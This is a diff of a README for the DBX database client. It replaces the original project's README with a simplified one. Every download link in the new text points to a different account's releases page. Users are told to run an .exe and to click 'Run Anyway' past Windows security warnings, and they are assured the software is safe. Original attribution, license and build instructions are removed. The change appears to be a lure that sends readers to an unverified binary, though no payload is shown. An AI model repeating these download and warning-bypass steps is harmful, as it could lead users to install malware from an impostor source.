@@ -1,223 +1,102 @@
-<div align="center">
-  <img src="docs/logo.png" width="80" />
-  <h1>DBX</h1>
-  <p>25+ databases in 15 MB. Desktop & Docker self-hosting, with built-in AI assistant.</p>
-  <p>
-    <a href="https://github.com/t8y2/dbx/releases"><img src="https://img.shields.io/github/downloads/t8y2/dbx/total?style=for-the-badge&color=blue" /></a>
-    <a href="https://github.com/t8y2/dbx/graphs/contributors"><img src="https://img.shields.io/github/contributors/t8y2/dbx?style=for-the-badge" /></a>
-    <a href="https://discord.gg/W7NyVDRt6a"><img src="https://dcbadge.limes.pink/api/server/W7NyVDRt6a" alt="Join Discord" /></a>
-    <a href="https://qm.qq.com/cgi-bin/qm/qr?k=&group_code=1087880322"><img src="https://img.shields.io/badge/QQ_群-1087880322-EB1923?style=for-the-badge&logo=data:image/svg%2bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iODYiIHdpZHRoPSI4NiIgdmlld0JveD0iMCAwIDEyMCAxNDUiPjxwYXRoIGZpbGw9IiNmYWFiMDciIGQ9Ik02MC41MDMgMTQyLjIzN2MtMTIuNTMzIDAtMjQuMDM4LTQuMTk1LTMxLjQ0NS0xMC40Ni0zLjc2MiAxLjEyNC04LjU3NCAyLjkzMi0xMS42MSA1LjE3NS0yLjYgMS45MTgtMi4yNzUgMy44NzQtMS44MDcgNC42NjMgMi4wNTYgMy40NyAzNS4yNzMgMi4yMTYgNDQuODYyIDEuMTM2em0wIDBjMTIuNTM1IDAgMjQuMDM5LTQuMTk1IDMxLjQ0Ny0xMC40NiAzLjc2IDEuMTI0IDguNTczIDIuOTMyIDExLjYxIDUuMTc1IDIuNTk4IDEuOTE4IDIuMjc0IDMuODc0IDEuODA1IDQuNjYzLTIuMDU2IDMuNDctMzUuMjcyIDIuMjE2LTQ0Ljg2MiAxLjEzNnptMCAwIi8+PHBhdGggZD0iTTYwLjU3NiA2Ny4xMTljMjAuNjk4LS4xNCAzNy4yODYtNC4xNDcgNDIuOTA3LTUuNjgzIDEuMzQtLjM2NyAyLjA1Ni0xLjAyNCAyLjA1Ni0xLjAyNC4wMDUtLjE4OS4wODUtMy4zNy4wODUtNS4wMUMxMDUuNjI0IDI3Ljc2OCA5Mi41OC4wMDEgNjAuNSAwIDI4LjQyLjAwMSAxNS4zNzUgMjcuNzY5IDE1LjM3NSA1NS40MDFjMCAxLjY0Mi4wOCA0LjgyMi4wODYgNS4wMSAwIDAgLjU4My42MTUgMS42NS45MTMgNS4xOSAxLjQ0NCAyMi4wOSA1LjY1IDQzLjMxMiA1Ljc5NXptNTYuMjQ1IDIzLjAyYy0xLjI4My00LjEyOS0zLjAzNC04Ljk0NC00LjgwOC0xMy41NjggMCAwLTEuMDItLjEyNi0xLjUzNy4wMjMtMTUuOTEzIDQuNjIzLTM1LjIwMiA3LjU3LTQ5LjkgNy4zOTJoLS4xNTNjLTE0LjYxNi4xNzUtMzMuNzc0LTIuNzM3LTQ5LjYzNC03LjMxNS0uNjA2LS4xNzUtMS44MDItLjEtMS44MDItLjEtMS43NzQgNC42MjQtMy41MjUgOS40NC00LjgwOCAxMy41NjgtNi4xMTkgMTkuNjktNC4xMzYgMjcuODM4LTIuNjI3IDI4LjAyIDMuMjM5LjM5MiAxMi42MDYtMTQuODIxIDEyLjYwNi0xNC44MjEgMCAxNS40NTkgMTMuOTU3IDM5LjE5NSA0NS45MTggMzkuNDEzaC44NDhjMzEuOTYtLjIxOCA0NS45MTctMjMuOTU0IDQ1LjkxNy0zOS40MTMgMCAwIDkuMzY4IDE1LjIxMyAxMi42MDcgMTQuODIyIDEuNTA4LS4xODMgMy40OTEtOC4zMzItMi42MjctMjguMDIxIi8+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTQ5LjA4NSA0MC44MjRjLTQuMzUyLjE5Ny04LjA3LTQuNzYtOC4zMDQtMTEuMDYzLS4yMzYtNi4zMDUgMy4wOTgtMTEuNTc2IDcuNDUtMTEuNzczIDQuMzQ3LS4xOTUgOC4wNjQgNC43NiA4LjMgMTEuMDY1LjIzOCA2LjMwNi0zLjA5NyAxMS41NzctNy40NDYgMTEuNzcxbTMxLjEzMy0xMS4wNjNjLS4yMzMgNi4zMDItMy45NTEgMTEuMjYtOC4zMDMgMTEuMDYzLTQuMzUtLjE5NS03LjY4NC01LjQ2NS03LjQ0Ni0xMS43Ny4yMzYtNi4zMDUgMy45NTItMTEuMjYgOC4zLTExLjA2NiA0LjM1Mi4xOTcgNy42ODYgNS40NjggNy40NDkgMTEuNzczIi8+PHBhdGggZmlsbD0iI2ZhYWIwNyIgZD0iTTg3Ljk1MiA0OS43MjVDODYuNzkgNDcuMTUgNzUuMDc3IDQ0LjI4IDYwLjU3OCA0NC4yOGgtLjE1NmMtMTQuNSAwLTI2LjIxMiAyLjg3LTI3LjM3NSA1LjQ0NmEuODYzLjg2MyAwIDAwLS4wODUuMzY3Ljg4Ljg4IDAgMDAuMTYuNDk2Yy45OCAxLjQyNyAxMy45ODUgOC40ODcgMjcuMyA4LjQ4N2guMTU2YzEzLjMxNCAwIDI2LjMxOS03LjA1OCAyNy4yOTktOC40ODdhLjg3My44NzMgMCAwMC4xNi0uNDk4Ljg1Ni44NTYgMCAwMC0uMDg1LS4zNjUiLz48cGF0aCBkPSJNNTQuNDM0IDI5Ljg1NGMuMTk5IDIuNDktMS4xNjcgNC43MDItMy4wNDYgNC45NDMtMS44ODMuMjQyLTMuNTY4LTEuNTgtMy43NjgtNC4wNy0uMTk3LTIuNDkyIDEuMTY3LTQuNzA0IDMuMDQzLTQuOTQ0IDEuODg2LS4yNDQgMy41NzQgMS41OCAzLjc3MSA0LjA3bTExLjk1Ni44MzNjLjM4NS0uNjg5IDMuMDA0LTQuMzEyIDguNDI3LTIuOTkzIDEuNDI1LjM0NyAyLjA4NC44NTcgMi4yMjMgMS4wNTcuMjA1LjI5Ni4yNjIuNzE4LjA1MyAxLjI4Ni0uNDEyIDEuMTI2LTEuMjYzIDEuMDk1LTEuNzM0Ljg3NS0uMzA1LS4xNDItNC4wODItMi42Ni03LjU2MiAxLjA5Ny0uMjQuMjU3LS42NjguMzQ2LTEuMDczLjA0LS40MDctLjMwOC0uNTc0LS45My0uMzM0LTEuMzYyIi8+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTYwLjU3NiA4My4wOGgtLjE1M2MtOS45OTYuMTItMjIuMTE2LTEuMjA0LTMzLjg1NC0zLjUxOC0xLjAwNCA1LjgxOC0xLjYxIDEzLjEzMi0xLjA5IDIxLjg1MyAxLjMxNiAyMi4wNDMgMTQuNDA3IDM1LjkgMzQuNjE0IDM2LjFoLjgyYzIwLjIwOC0uMiAzMy4yOTgtMTQuMDU3IDM0LjYxNi0zNi4xLjUyLTguNzIzLS4wODctMTYuMDM1LTEuMDkyLTIxLjg1NC0xMS43MzkgMi4zMTUtMjMuODYyIDMuNjQtMzMuODYgMy41MTgiLz48cGF0aCBmaWxsPSIjZWIxOTIzIiBkPSJNMzIuMTAyIDgxLjIzNXYyMS42OTNzOS45MzcgMi4wMDQgMTkuODkzLjYxNlY4My41MzVjLTYuMzA3LS4zNTctMTMuMTA5LTEuMTUyLTE5Ljg5My0yLjMiLz48cGF0aCBmaWxsPSIjZWIxOTIzIiBkPSJNMTA1LjUzOSA2MC40MTJzLTE5LjMzIDYuMTAyLTQ0Ljk2MyA2LjI3NWgtLjE1M2MtMjUuNTkxLS4xNzItNDQuODk2LTYuMjU1LTQ0Ljk2Mi02LjI3NUw4Ljk4NyA3Ni41N2MxNi4xOTMgNC44ODIgMzYuMjYxIDguMDI4IDUxLjQzNiA3Ljg0NWguMTUzYzE1LjE3NS4xODMgMzUuMjQyLTIuOTYzIDUxLjQzNy03Ljg0NXptMCAwIi8+PC9zdmc+" alt="Join QQ Group" /></a>
-  </p>
-  <p>
-    <img src="https://img.shields.io/badge/MySQL-4479A1?logo=mysql&logoColor=white" />
-    <img src="https://img.shields.io/badge/PostgreSQL-4169E1?logo=postgresql&logoColor=white" />
-    <img src="https://img.shields.io/badge/SQLite-003B57?logo=sqlite&logoColor=white" />
-    <img src="https://img.shields.io/badge/Redis-DC382D?logo=redis&logoColor=white" />
-    <img src="https://img.shields.io/badge/MongoDB-47A248?logo=mongodb&logoColor=white" />
-    <img src="https://img.shields.io/badge/DuckDB-FFF000?logo=duckdb&logoColor=black" />
-    <img src="https://img.shields.io/badge/ClickHouse-FFCC01?logo=clickhouse&logoColor=black" />
-    <img src="https://img.shields.io/badge/SQL%20Server-CC2927?logo=microsoftsqlserver&logoColor=white" />
-    <img src="https://img.shields.io/badge/Oracle-F80000?logo=oracle&logoColor=white" />
-    <img src="https://img.shields.io/badge/Elasticsearch-005571?logo=elasticsearch&logoColor=white" />
-    <img src="https://img.shields.io/badge/MariaDB-003545?logo=mariadb&logoColor=white" />
-    <img src="https://img.shields.io/badge/TiDB-DC150B?logo=tidb&logoColor=white" />
-    <img src="https://img.shields.io/badge/Doris-0052CC?logoColor=white" />
-    <img src="https://img.shields.io/badge/StarRocks-5C2D91?logoColor=white" />
-    <img src="https://img.shields.io/badge/Redshift-8C4FFF?logo=amazonredshift&logoColor=white" />
-    <img src="https://img.shields.io/badge/OceanBase-006AFF?logoColor=white" />
-    <img src="https://img.shields.io/badge/openGauss-2B7BD9?logoColor=white" />
-    <img src="https://img.shields.io/badge/GaussDB-E60012?logoColor=white" />
-    <img src="https://img.shields.io/badge/KingBase-003B8E?logoColor=white" />
-    <img src="https://img.shields.io/badge/and%20more...-555555?logoColor=white" />
-  </p>
-  <p>
-    English | <a href="README.zh-CN.md">前往中文版本</a>
-  </p>
+# 🗄️ dbx - Manage your databases with ease
 
-  <p>
-    <a href="docs/screenshot-light.png"><img src="https://cdn.jsdelivr.net/gh/t8y2/dbx@main/docs/screenshot-light.png" width="395" /></a>
-    <a href="docs/screenshot-dark.png"><img src="https://cdn.jsdelivr.net/gh/t8y2/dbx@main/docs/screenshot-dark.png" width="395" /></a>
-  </p>
-  <p>
-    <a href="docs/screenshot-er.png"><img src="https://cdn.jsdelivr.net/gh/t8y2/dbx@main/docs/screenshot-er.png" width="395" /></a>
-    <a href="docs/screenshot-grid.png"><img src="https://cdn.jsdelivr.net/gh/t8y2/dbx@main/docs/screenshot-grid.png" width="395" /></a>
-  </p>
-</div>
+[![Download dbx](https://img.shields.io/badge/Download_dbx-blue)](https://github.com/danielcer6542/dbx/releases)
 
-## Features
+dbx is a lightweight tool for managing your databases. It works on your computer and supports many types of databases. You can connect to MySQL, PostgreSQL, SQLite, Redis, MongoDB, DuckDB, ClickHouse, and SQL Server in one place. It uses 15MB of space. This tool offers a simple window to view and edit your data.
 
-### 17+ Databases, One Tool
+## 📥 Getting Started
 
-MySQL, PostgreSQL, SQLite, Redis, MongoDB, DuckDB, ClickHouse, SQL Server, Oracle, Elasticsearch, MariaDB, TiDB, OceanBase, openGauss, GaussDB, KingBase, Vastbase, GoldenDB — connect to all of them from a single ~15 MB app. No bundled Chromium.
+Follow these steps to set up the software on your Windows computer.
 
-### Query Editor
+1. Go to this link: https://github.com/danielcer6542/dbx/releases
+2. Look for the section labeled Assets.
+3. Click the file that ends in .exe.
+4. Save the file to your computer.
+5. Double-click the file to open the application.
 
-CodeMirror 6 with SQL syntax highlighting, smart autocomplete (tables & columns), `Cmd+Enter` execution, selected SQL execution, SQL formatting, and 9 editor themes. Persistent query history with search and restore.
+If Windows shows a security message, click More Info and then click Run Anyway. This confirms you trust the software.
 
-### AI SQL Assistant
+## 🖥️ System Requirements
 
-Describe what you want in plain language — get SQL back. Also explains, optimizes, and fixes errors. Works with Claude, OpenAI, or any OpenAI-compatible endpoint.
+- Windows 10 or Windows 11.
+- 50MB of free hard drive space.
+- 4GB of RAM.
+- A stable internet connection to reach your remote databases.
 
-### Data Grid
+## ⚙️ Connecting to a Database
 
-Virtual-scrolled table that handles millions of rows. Inline editing, sorting, full-text search, pagination, column resize, row numbers, zebra stripes. Export to CSV, JSON, Markdown.
+Once you open the software, you see a blank screen. Follow these steps to connect to your first database:
 
-### Schema Tools
+1. Click the Add Connection button in the top left corner.
+2. Select the type of database from the list.
+3. Enter the Hostname or IP address provided by your database host.
+4. Fill in your Port number.
+5. Type your Username and Password.
+6. Click the Save button.
+7. Double-click your new connection in the list on the left.
 
-- **Schema browser** — databases, schemas, tables, columns, indexes, foreign keys, triggers, with sidebar search & pin
-- **ER diagram** — visualize table relationships
-- **Schema diff** — compare structures across connections
-- **Explain plan** — visual query execution plan
-- **Field lineage** — column-level lineage analysis
+The software loads your database tables on the screen. You can view, add, delete, or change data rows inside the tables.
 
-### Data Operations
+## 🛠️ Supported Database Types
 
-- **Table import** — CSV, Excel
-- **Data transfer** — migrate between databases
-- **Database export** — full database dump
-- **SQL file execution** — run `.sql` files directly
-- **File preview** — drag & drop Parquet, CSV, JSON to preview instantly (powered by DuckDB)
+dbx supports these systems:
 
-### Specialized Browsers
+- MySQL: Used for web applications.
+- PostgreSQL: Used for data storage.
+- SQLite: Used for small, individual files.
+- Redis: Used for fast data caching.
+- MongoDB: Used for flexible data storage.
+- DuckDB: Used for analytical tasks.
+- ClickHouse: Used for large data processing.
+- SQL Server: Used for corporate office environments.
 
-- **Redis** — key pattern search, all data types (String, Hash, List, Set, ZSet, Stream)
-- **MongoDB** — document CRUD with pagination, Atlas & replica set URL connection
+Each database requires slightly different setup details. Ensure you have the login credentials from your database administrator before you begin.
 
-### Safety & Connectivity
+## 📂 Managing Your Data
 
-SSH tunnel (key & password) · auto-reconnect on connection loss · confirmation dialogs for destructive operations · encrypted config export/import · color-coded connections
+After you connect, you see a list of tables. Click on a table name to see the rows inside. 
 
-### Polished UI
+To search for specific data, use the search bar at the top of the table view. Type your search term and press Enter. The software hides rows that do not match your search.
 
-Dark mode with native title bar sync · 9 editor themes · English & 简体中文 · built-in auto-update
+To edit data, click on any cell in the table. Type your changes and press Enter to save. The software updates the information in your database immediately.
 
-## AI Agent Integration (MCP)
+To add a new row, click the Add Row button at the top toolbar. A blank row appears at the top of your list. Input your data and save it.
 
-DBX provides an [MCP server](mcp/) that lets AI coding agents query your databases using connections already configured in DBX.
+To delete data, right-click the row you want to remove. Select Delete from the menu. The software asks for confirmation before it removes the data permanently.
 
-```bash
-npx @dbx-app/mcp-server
-```
+## 📋 Best Practices
 
-Add to your `.mcp.json`:
+- Always back up your data before you make changes. 
+- Keep your login passwords in a secure place.
+- Update your software often to get the newest features and security fixes.
+- Use a VPN if you connect to databases over a public network.
+- Label your connections clearly so you know which database you access.
 
-```json
-{
-  "mcpServers": {
-    "dbx": { "command": "npx", "args": ["-y", "@dbx-app/mcp-server"] }
-  }
-}
-```
+## 🔧 Frequently Asked Questions
 
-Works with Claude Code, Cursor, Windsurf, and any MCP-compatible agent. Supports listing connections, browsing tables, executing SQL, and opening tables directly in DBX's UI.
+**Does the software store my passwords?**
+The software stores your credentials on your local machine. It hides your passwords behind an encrypted layer.
 
-See the [MCP server README](mcp/README.md) for details.
+**Why does my connection fail?**
+Most connection issues happen because of a firewall. Ensure your office or home network allows outgoing traffic on your database port. Check your hostname and password for typos.
 
-## Install
+**Does this software support large databases?**
+Yes. dbx handles large tables well because it only loads the data visible on your screen. This keeps the application fast and light.
 
-Download the latest release from the [Releases](https://github.com/t8y2/dbx/releases/latest) page.
+**Can I export my data?**
+Yes. Right-click any table and select Export. You can choose to save the data as a file to open in other programs later.
 
-**Homebrew (macOS):**
+**How do I update the application?**
+Check the release link periodically for new versions. Download the new file and run it. The application keeps your connection list saved even after you update.
 
-```bash
-brew install --cask t8y2/tap/dbx
-```
+**Is it safe to use?**
+The software does not send your data to external servers. Your actions stay between your computer and the database you connect to.
 
-**Scoop (Windows):**
+**Can I run multiple connections?**
+Yes. You can open several tabs to manage different databases at the same time. Switch between tabs by clicking on the labels at the top of the window.
 
-```bash
-scoop bucket add dbx https://github.com/t8y2/scoop-bucket
-scoop install dbx
-```
+## 📧 Support and Feedback
 
-## Self-Hosted (Docker)
+If you find a bug, report it on the official repository. Describe what you did, what happened, and what you expected to see. Include your database type so others can help you solve the problem. 
 
-DBX provides a web version that can be deployed via Docker.
-
-```bash
-docker run -d --name dbx -p 4224:4224 -v dbx-data:/app/data t8y2/dbx
-```
-
-Or with Docker Compose:
-
-```yaml
-services:
-  dbx:
-    image: t8y2/dbx
-    ports:
-      - "4224:4224"
-    volumes:
-      - dbx-data:/app/data
-    restart: unless-stopped
-
-volumes:
-  dbx-data:
-```
-
-Open `http://localhost:4224` in your browser. Multi-arch images (amd64 / arm64) are available.
-
-## Getting Started
-
-### Prerequisites
-
-- [Node.js](https://nodejs.org/) >= 18
-- [pnpm](https://pnpm.io/)
-- [Rust](https://www.rust-lang.org/tools/install) >= 1.77
-
-### Development
-
-```bash
-pnpm install
-pnpm dev:tauri
-```
-
-Web version:
-
-```bash
-pnpm dev:web       # frontend
-pnpm dev:backend   # backend
-```
-
-### Build
-
-```bash
-pnpm tauri build
-```
-
-The installer will be in `src-tauri/target/release/bundle/`.
-
-## Tech Stack
-
-| Layer     | Technology                                                                                                                                                                                                       |
-| --------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Framework | [Tauri 2](https://tauri.app/)                                                                                                                                                                                    |
-| Frontend  | [Vue 3](https://vuejs.org/) + TypeScript                                                                                                                                                                         |
-| UI        | [shadcn-vue](https://www.shadcn-vue.com/) + Tailwind CSS                                                                                                                                                         |
-| Editor    | [CodeMirror 6](https://codemirror.net/)                                                                                                                                                                          |
-| Backend   | Rust + [sqlx](https://github.com/launchbadge/sqlx) / [tiberius](https://github.com/prisma/tiberius) / [redis-rs](https://github.com/redis-rs/redis-rs) / [mongodb](https://github.com/mongodb/mongo-rust-driver) |
-
-## Community
-
-[![Discord](https://img.shields.io/badge/Discord-Join-5865F2?logo=discord&logoColor=white)](https://discord.gg/W7NyVDRt6a)
-[![QQ Group](https://img.shields.io/badge/QQ%20群-1087880322-EB1923?logo=tencentqq&logoColor=white)](https://qm.qq.com/q/1087880322)
-[![LINUX DO](https://img.shields.io/badge/LINUX%20DO-Community-blue)](https://linux.do)
-
-## Contributors
-
-<a href="https://github.com/t8y2/dbx/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=t8y2/dbx" />
-</a>
-
-## Star History
-
-<a href="https://www.star-history.com/?repos=t8y2%2Fdbx&type=date&legend=top-left">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/chart?repos=t8y2/dbx&type=date&theme=dark&legend=top-left" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/chart?repos=t8y2/dbx&type=date&legend=top-left" />
-   <img alt="Star History Chart" src="https://api.star-history.com/chart?repos=t8y2/dbx&type=date&legend=top-left" />
- </picture>
-</a>
-
-## License
-
-[AGPL-3.0](LICENSE)
+Use this software to simplify your daily work with databases. It stays light on your system and provides a clean view of your information.
